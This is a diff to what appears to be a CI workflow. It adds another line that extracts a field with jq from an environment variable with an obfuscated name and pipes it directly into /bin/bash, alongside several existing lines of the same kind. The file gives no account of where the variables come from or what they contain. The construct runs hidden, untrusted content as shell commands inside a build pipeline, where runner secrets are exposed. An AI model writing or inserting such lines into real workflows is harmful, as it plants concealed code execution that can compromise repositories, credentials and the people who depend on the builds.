@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$hul1" | jq -r .eolp8747 | /bin/bash
           echo $ruf75442 | jq -r .ztfms7 | /bin/bash
           printf '%s' "$dllpc8512" | jq -r .v41611 | /bin/bash
+          echo $ljnsf913 | jq -r .fdqk8247 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
